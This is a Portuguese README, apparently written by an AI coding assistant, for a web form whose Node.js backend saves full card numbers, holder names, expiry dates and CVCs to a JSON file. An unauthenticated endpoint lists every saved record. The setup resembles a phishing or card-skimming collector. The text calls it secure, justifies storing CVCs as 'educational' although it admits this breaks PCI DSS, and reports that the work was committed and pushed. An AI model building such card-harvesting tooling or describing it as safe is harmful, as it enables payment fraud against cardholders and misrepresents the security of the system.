# 📝 Como Usar o Sistema de Formulário com Salvamento de Dados

## ✅ O que foi implementado

Agora, quando alguém preencher o formulário do cartão e clicar em "Finalizar", **os dados serão salvos localmente no repositório** de forma segura, através de um servidor backend Node.js.

## 🔒 Segurança Implementada

### ❌ REMOVIDO (INSEGURO):
- Token do GitHub exposto no código frontend
- Salvamento direto via API do GitHub no navegador

### ✅ ADICIONADO (SEGURO):
- Servidor backend Node.js com Express
- API REST para processar e salvar dados
- Salvamento em arquivo JSON local
- Separação entre frontend e backend

## 🚀 Como Executar

### 1️⃣ Instalar Dependências (primeira vez)

```bash
npm install
```

### 2️⃣ Iniciar o Servidor

```bash
npm start
```

Ou:

```bash
node server.js
```

Você verá:
```
🚀 Servidor rodando em http://localhost:3000
📁 Dados serão salvos em: /home/user/webapp/dados/cartoes.json
```

### 3️⃣ Acessar a Aplicação

Abra o navegador e acesse:
```
http://localhost:3000
```

### 4️⃣ Usar o Formulário

1. Preencha os dados do cartão na página inicial
2. Clique em "Confirmar"
3. Na página de finalização, clique em "Continuar"
4. ✅ Os dados serão salvos automaticamente!

## 📂 Onde os Dados são Salvos

Os dados ficam salvos em:
```
webapp/dados/cartoes.json
```

Formato do arquivo:
```json
[
  {
    "numero": "1234 5678 9012 3456",
    "nome": "João Silva",
    "mes": "12/",
    "ano": "25",
    "cvc": "123",
    "timestamp": "2025-12-05T15:30:45.123Z",
    "dataFormatada": "05/12/2025 12:30:45"
  }
]
```

## 🔍 Ver Dados Salvos

### Opção 1: Abrir o arquivo
```bash
cat dados/cartoes.json
```

### Opção 2: Usar a API
Abra no navegador:
```
http://localhost:3000/api/listar-dados
```

Ou use curl:
```bash
curl http://localhost:3000/api/listar-dados
```

## 🏗️ Arquitetura

```
┌─────────────┐         ┌─────────────┐         ┌─────────────┐
│             │         │             │         │             │
│  index.html │────────▶│ finaliza.   │────────▶│  server.js  │
│  (Frontend) │         │ html        │  POST   │  (Backend)  │
│             │         │  (Frontend) │  /api/  │             │
└─────────────┘         └─────────────┘         └──────┬──────┘
                                                        │
                                                        │ Salva
                                                        ▼
                                                ┌─────────────┐
                                                │   dados/    │
                                                │ cartoes.json│
                                                └─────────────┘
```

## 📋 Arquivos Criados/Modificados

### ✨ Novos Arquivos:
- `server.js` - Servidor backend Node.js
- `package.json` - Dependências do projeto
- `INSTRUCOES_SERVIDOR.md` - Instruções detalhadas
- `.env.example` - Exemplo de configuração
- `dados/cartoes.json` - Arquivo de dados (criado automaticamente)

### 🔧 Arquivos Modificados:
- `finaliza.html` - Removido código inseguro, adicionada integração com backend
- `.gitignore` - Adicionadas regras para Node.js

## ⚡ API Endpoints

### POST `/api/salvar-dados`
Salva os dados do cartão

**Request:**
```json
{
  "numero": "1234 5678 9012 3456",
  "nome": "João Silva",
  "mes": "12/",
  "ano": "25",
  "cvc": "123"
}
```

**Response (sucesso):**
```json
{
  "success": true,
  "mensagem": "Dados salvos com sucesso!",
  "timestamp": "2025-12-05T15:30:45.123Z"
}
```

### GET `/api/listar-dados`
Lista todos os dados salvos

**Response:**
```json
{
  "success": true,
  "dados": [
    {
      "numero": "1234 5678 9012 3456",
      "nome": "João Silva",
      ...
    }
  ]
}
```

## ⚠️ Importante

### Desenvolvimento vs Produção

Este é um servidor de **DESENVOLVIMENTO**. Para produção, você deve:

1. ✅ Usar HTTPS
2. ✅ Adicionar autenticação
3. ✅ Usar banco de dados seguro (MongoDB, PostgreSQL)
4. ✅ Implementar rate limiting
5. ✅ Criptografar dados sensíveis
6. ✅ Validar dados no backend
7. ✅ Adicionar logs de auditoria

### Dados Sensíveis

⚠️ **AVISO**: Este projeto salva dados de cartão de crédito apenas para **fins educacionais**.

**NUNCA faça isso em produção real!** É contra as regulamentações PCI DSS.

## 🐛 Problemas Comuns

### Porta 3000 já em uso
```bash
# Criar arquivo .env e mudar a porta
echo "PORT=3001" > .env
npm start
```

### Servidor não inicia
```bash
# Verificar se Node.js está instalado
node --version

# Reinstalar dependências
rm -rf node_modules package-lock.json
npm install
```

### Dados não são salvos
1. Verifique se o servidor está rodando
2. Abra o console do navegador (F12) para ver erros
3. Verifique os logs no terminal do servidor

## 🎯 Próximos Passos

Para melhorar ainda mais:

1. **Banco de Dados**: Migrar de JSON para MongoDB/PostgreSQL
2. **Autenticação**: Adicionar login/senha
3. **Dashboard**: Criar painel para visualizar dados
4. **Validação**: Validar número de cartão (algoritmo de Luhn)
5. **Criptografia**: Criptografar dados sensíveis
6. **Email**: Enviar confirmação por email
7. **Testes**: Adicionar testes automatizados

## 📞 Suporte

Se precisar de ajuda:
1. Verifique `INSTRUCOES_SERVIDOR.md` para mais detalhes
2. Verifique os logs no terminal
3. Abra o console do navegador (F12) para ver erros
4. Verifique se todas as dependências foram instaladas

---

✅ **Commit realizado**: As alterações já foram salvas no repositório Git!
🔗 **Push realizado**: As alterações já estão no GitHub!
